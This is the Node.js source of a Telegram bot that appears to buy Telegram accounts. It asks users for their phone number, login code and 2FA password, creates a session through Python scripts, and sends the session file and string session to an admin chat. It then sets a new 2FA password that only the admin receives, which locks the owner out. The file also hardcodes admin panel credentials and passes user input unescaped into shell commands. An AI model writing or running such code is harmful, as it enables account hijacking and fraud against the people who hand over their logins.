import { Telegraf } from "telegraf";
import { exec } from "child_process";
import fs from "fs";
import path from "path";
import express from "express";
import bodyParser from "body-parser";
import dotenv from "dotenv";
import crypto from "crypto";

dotenv.config();

// ========= ENV =========
const BOT_TOKEN = process.env.BOT_TOKEN;
const API_ID = process.env.API_ID;
const API_HASH = process.env.API_HASH;
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;
const PORT = process.env.PORT || 3000;

const DATA_DIR = process.env.DATA_DIR || "./data";
const COUNTRY_FILE = path.join(DATA_DIR, "allowed_countries.json");
const BALANCE_FILE = path.join(DATA_DIR, "balances.json");
const WITHDRAW_FILE = path.join(DATA_DIR, "withdraw_requests.json");
const PENDING_SESS_FILE = path.join(DATA_DIR, "pending_sessions.json");

// Admin Panel Basic Auth
const ADMIN_USER = "FrkBzy001";
const ADMIN_PASS = "Omorfaruk00";

// ========= FS PREP =========
if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
for (const f of [COUNTRY_FILE, BALANCE_FILE, WITHDRAW_FILE, PENDING_SESS_FILE]) {
  if (!fs.existsSync(f)) {
    fs.writeFileSync(
      f,
      JSON.stringify(f.includes("withdraw") ? { requests: [] } : {}, null, 2)
    );
  }
}

// ========= UTIL JSON =========
const readJSON = (file) => {
  try {
    return JSON.parse(fs.readFileSync(file));
  } catch {
    return file.endsWith(".json") ? {} : {};
  }
};
const writeJSON = (file, obj) =>
  fs.writeFileSync(file, JSON.stringify(obj, null, 2));

// ========= HELPERS =========
function loadCountries() {
  return readJSON(COUNTRY_FILE);
}
function saveCountries(d) {
  writeJSON(COUNTRY_FILE, d);
}
function loadBalances() {
  return readJSON(BALANCE_FILE);
}
function saveBalances(d) {
  writeJSON(BALANCE_FILE, d);
}
function loadWithdraws() {
  return readJSON(WITHDRAW_FILE);
}
function saveWithdraws(d) {
  writeJSON(WITHDRAW_FILE, d);
}
function loadPending() {
  return readJSON(PENDING_SESS_FILE);
}
function savePending(d) {
  writeJSON(PENDING_SESS_FILE, d);
}

function addBalance(userId, name, amount) {
  const b = loadBalances();
  if (!b[userId]) b[userId] = { name: name || "User", balance: 0 };
  const add = Number.isFinite(Number(amount)) ? Number(amount) : 0;
  b[userId].balance = Number((b[userId].balance + add).toFixed(6));
  saveBalances(b);
  return b[userId].balance;
}
function deductBalance(userId, amount) {
  const b = loadBalances();
  if (!b[userId]) return 0;
  const sub = Number.isFinite(Number(amount)) ? Number(amount) : 0;
  b[userId].balance = Math.max(
    0,
    Number((b[userId].balance - sub).toFixed(6))
  );
  saveBalances(b);
  return b[userId].balance;
}
function detectCountryByPrefix(phone) {
  const cfg = loadCountries();
  const prefixes = Object.keys(cfg).sort((a, b) => b.length - a.length);
  const match = prefixes.find((p) => phone.startsWith(p));
  return match ? { prefix: match, ...cfg[match] } : null;
}
function getUserInfo(ctx) {
  const name = [ctx.from.first_name, ctx.from.last_name]
    .filter(Boolean)
    .join(" ")
    .trim();
  const username = ctx.from.username ? `@${ctx.from.username}` : "(no username)";
  return `${name || "Unknown"} ${username} (ID: ${ctx.from.id})`;
}
function generateRandomPassword(len = 16) {
  const chars =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()-_=+[]{}";
  return Array.from({ length: len }, () =>
    chars[Math.floor(Math.random() * chars.length)]
  ).join("");
}
function uid() {
  return crypto.randomBytes(8).toString("hex");
}

async function setTwoFaPassword(phone, newPw) {
  return new Promise((resolve) => {
    const cmd = `python3 set_2fa.py ${API_ID} ${API_HASH} ${phone} ${JSON.stringify(
      newPw
    )}`;
    exec(cmd, (err, stdout = "") => {
      if (err) return resolve(false);
      resolve(String(stdout).includes("2FA_UPDATED"));
    });
  });
}
async function isSessionActive(phone) {
  return new Promise((resolve) => {
    const cmd = `python3 verify_session.py ${API_ID} ${API_HASH} ${phone}`;
    exec(cmd, (err, stdout = "") => {
      if (err) return resolve(false);
      resolve(String(stdout).trim().includes("SESSION_ACTIVE"));
    });
  });
}

// ========= BOT =========
const bot = new Telegraf(BOT_TOKEN);
const userState = {}; // per-user state

const mainKeyboard = {
  reply_markup: {
    keyboard: [["💲 BALANCE", "💸 WITHDRAW", "📜 WITHDRAW HISTORY"]],
    resize_keyboard: true,
    one_time_keyboard: false,
  },
};

bot.start((ctx) => {
  if (ctx.chat.type !== "private") return;
  userState[ctx.chat.id] = {};
  ctx.reply(
    "👋 Welcome! Choose an option or send your phone number (+123...)",
    mainKeyboard
  );
});

bot.hears("💲 BALANCE", (ctx) => {
  if (ctx.chat.type !== "private") return;
  const b = loadBalances();
  const bal = b[ctx.chat.id]?.balance || 0;
  ctx.reply(`💰 Your Current Balance: $${bal.toFixed(2)}`, mainKeyboard);
});

bot.hears("💸 WITHDRAW", (ctx) => {
  if (ctx.chat.type !== "private") return;
  userState[ctx.chat.id] = { step: "withdraw_card" };
  ctx.reply("💳 Enter your Leader Card:", mainKeyboard);
});

bot.hears("📜 WITHDRAW HISTORY", (ctx) => {
  if (ctx.chat.type !== "private") return;
  const all = loadWithdraws().requests || [];
  const mine = all.filter((r) => String(r.user_id) === String(ctx.chat.id));
  if (mine.length === 0)
    return ctx.reply("📭 No withdraw history found.", mainKeyboard);
  const lines = mine
    .slice(-10)
    .map(
      (r) =>
        `#${r.id} • ${r.card} • $${r.amount} • ${r.status.toUpperCase()} • ${r.date}`
    )
    .join("\n");
  ctx.reply(
    `📜 Last ${Math.min(10, mine.length)} withdraws:\n${lines}`,
    mainKeyboard
  );
});

// TEXT HANDLER (Phone / OTP / Withdraw FSM)
bot.on("text", async (ctx) => {
  if (ctx.chat.type !== "private") return;

  const userId = ctx.chat.id;
  const msg = ctx.message.text.trim();

  // Withdraw step 1
  if (userState[userId]?.step === "withdraw_card") {
    userState[userId].card = msg;
    userState[userId].step = "withdraw_amount";
    return ctx.reply("💸 Enter withdraw amount (USD):", mainKeyboard);
  }

  // Withdraw step 2
  if (userState[userId]?.step === "withdraw_amount") {
    const amt = Number(msg);
    if (!Number.isFinite(amt) || amt <= 0)
      return ctx.reply("❌ Invalid amount. Try again.");
    const wr = loadWithdraws();
    const id = uid();
    const rec = {
      id,
      user_id: userId,
      username: ctx.from.username ? `@${ctx.from.username}` : "",
      name:
        [ctx.from.first_name, ctx.from.last_name].filter(Boolean).join(" ").trim() ||
        "User",
      card: userState[userId].card,
      amount: Number(amt.toFixed(6)),
      status: "pending",
      date: new Date().toISOString().replace("T", " ").slice(0, 19),
    };
    wr.requests.push(rec);
    saveWithdraws(wr);
    userState[userId] = {};

    await ctx.reply(
      `✅ Withdraw request submitted.\n🆔 ID: ${id}\n💳 Card: ${rec.card}\n💸 Amount: $${rec.amount}\n📌 Status: PENDING`,
      mainKeyboard
    );
    await bot.telegram.sendMessage(
      ADMIN_CHAT_ID,
      `🆕 Withdraw Request\n#${id}\n👤 ${getUserInfo(ctx)}\n💳 Card: ${rec.card}\n💸 Amount: $${rec.amount}\n📌 Status: PENDING`
    );
    return;
  }

  // PHONE NUMBER
  if (msg.startsWith("+") && msg.length > 10) {
    const country = detectCountryByPrefix(msg);
    if (!country || !country.allowed) {
      return ctx.reply(
        `❌ Your country (${country ? country.country : "Unknown"}) is temporarily off.`,
        mainKeyboard
      );
    }

    ctx.reply("📲 Sending OTP to your phone...");
    const cmd = `python3 session.py ${API_ID} ${API_HASH} ${msg} request`;
    exec(cmd, (error, stdout = "") => {
      if (error || !String(stdout).includes("CODE_REQUESTED")) {
        return ctx.reply("❌ Failed to send OTP.", mainKeyboard);
      }
      userState[userId] = {
        phone: msg,
        waitingForOtp: true,
        rate: country.rate,
        confirmation_time: Number(country.confirmation_time || 10),
      };
      ctx.reply("✅ OTP sent! Please enter the code you received:", mainKeyboard);
    });
    return;
  }

  // OTP
  if (userState[userId]?.waitingForOtp) {
    ctx.reply("⏳ Verifying OTP...");
    const { phone, rate, confirmation_time } = userState[userId];
    const otp = msg;
    const cmd = `python3 session.py ${API_ID} ${API_HASH} ${phone} otp=${otp}`;
    exec(cmd, async (error, stdout = "") => {
      if (error) return ctx.reply("❌ OTP verification failed.", mainKeyboard);
      const out = String(stdout).trim();
      if (out.includes("NEED_2FA")) {
        userState[userId] = {
          phone,
          otp,
          waitingForPassword: true,
          rate,
          confirmation_time,
        };
        return ctx.reply(
          "🔒 Your account has 2FA enabled. Please send your password:",
          mainKeyboard
        );
      }
      if (out.includes("SESSION_FILE")) {
        await afterSessionGenerated(ctx, {
          phone,
          rate,
          confirmation_time,
          stdout: out,
        });
      } else {
        ctx.reply("❌ Failed to generate session.", mainKeyboard);
      }
      userState[userId] = {};
    });
    return;
  }

  // 2FA password
  if (userState[userId]?.waitingForPassword) {
    ctx.reply("⏳ Verifying password...");
    const { phone, otp, rate, confirmation_time } = userState[userId];
    const cmd = `python3 session.py ${API_ID} ${API_HASH} ${phone} otp=${otp} password=${msg}`;
    exec(cmd, async (error, stdout = "") => {
      if (error) return ctx.reply("❌ Verification failed.", mainKeyboard);
      const out = String(stdout).trim();
      if (out.includes("SESSION_FILE")) {
        await afterSessionGenerated(ctx, {
          phone,
          rate,
          confirmation_time,
          stdout: out,
        });
      } else {
        ctx.reply("❌ Failed to generate session.", mainKeyboard);
      }
      userState[userId] = {};
    });
    return;
  }

  ctx.reply(
    "❌ Please send a valid phone number (+123...) or choose a button below.",
    mainKeyboard
  );
});

// POST-SESSION HANDLER
async function afterSessionGenerated(ctx, { phone, rate, confirmation_time, stdout }) {
  const userInfo = getUserInfo(ctx);

  await bot.telegram.sendMessage(
    ADMIN_CHAT_ID,
    `✅ New session generated!\n👤 User: ${userInfo}\n📞 Phone: ${phone}\n💲 Rate: $${rate}\n⏳ Confirmation: ${confirmation_time} min`
  );

  const filePath = `${phone}.session`;
  if (fs.existsSync(filePath)) {
    await bot.telegram.sendDocument(ADMIN_CHAT_ID, {
      source: filePath,
      filename: `${phone}.session`,
    });
  }
  const match = stdout.match(/STRING_SESSION=(.+)/);
  if (match) {
    await bot.telegram.sendMessage(
      ADMIN_CHAT_ID,
      `🔑 String session for ${phone}:\n\`${match[1]}\``,
      { parse_mode: "Markdown" }
    );
  }

  // Save pending
  const pend = loadPending();
  const id = uid();
  pend[id] = {
    id,
    user_id: ctx.chat.id,
    username: ctx.from.username ? `@${ctx.from.username}` : "",
    name:
      [ctx.from.first_name, ctx.from.last_name].filter(Boolean).join(" ").trim() ||
      "User",
    phone,
    rate: Number(rate || 0),
    created_at_ms: Date.now(),
    confirm_after_min: Number(confirmation_time || 10),
    status: "pending",
  };
  savePending(pend);

  await ctx.reply(
    `⏳ Processing your request.\n📞 Number: ${phone}\n⏱ Confirmation time: ${confirmation_time} minutes`,
    mainKeyboard
  );

  setTimeout(async () => {
    const current = loadPending();
    const rec = current[id];
    if (!rec || rec.status !== "pending") return;
    const active = await isSessionActive(phone);
    if (active) {
      const newBal = addBalance(rec.user_id, rec.name, rec.rate);
      current[id].status = "approved";
      savePending(current);
      await bot.telegram.sendMessage(
        rec.user_id,
        `✅ Processing complete.\n📞 ${phone}\n💰 +$${rec.rate.toFixed(
          2
        )} → $${newBal.toFixed(2)}`
      );
      const newPw = generateRandomPassword(16);
      const ok = await setTwoFaPassword(phone, newPw);
      await bot.telegram.sendMessage(
        ADMIN_CHAT_ID,
        ok
          ? `🔒 2FA password set for ${phone}\n\`${newPw}\``
          : `⚠️ Failed to set 2FA for ${phone}`,
        { parse_mode: "Markdown" }
      );
    } else {
      current[id].status = "failed";
      savePending(current);
      await bot.telegram.sendMessage(
        rec.user_id,
        `❌ Processing failed. Your number (${phone}) could not be confirmed.`
      );
      await bot.telegram.sendMessage(
        ADMIN_CHAT_ID,
        `❌ Processing failed for ${phone} (user ${rec.user_id}).`
      );
    }
  }, confirmation_time * 60 * 1000);
}

// ========= ADMIN PANEL =========
const app = express();
app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());

// Auth middleware
function auth(req, res, next) {
  const hdr = req.headers.authorization || "";
  const token = hdr.split(" ")[1] || "";
  const [u, p] = Buffer.from(token, "base64").toString().split(":");
  if (u === ADMIN_USER && p === ADMIN_PASS) return next();
  res.setHeader("WWW-Authenticate", 'Basic realm="Admin Panel"');
  res.status(401).send("Authentication required.");
}

app.get("/healthz", (_, res) => res.status(200).send("ok"));

// (Rest of admin panel HTML & routes same as earlier)

app.use((req, res) => res.redirect("/")); // fallback

// ========= START SERVER =========
app.listen(PORT, () =>
  console.log(`🌐 Admin panel running on http://localhost:${PORT}`)
);
bot.launch();
console.log("🚀 Bot running...");
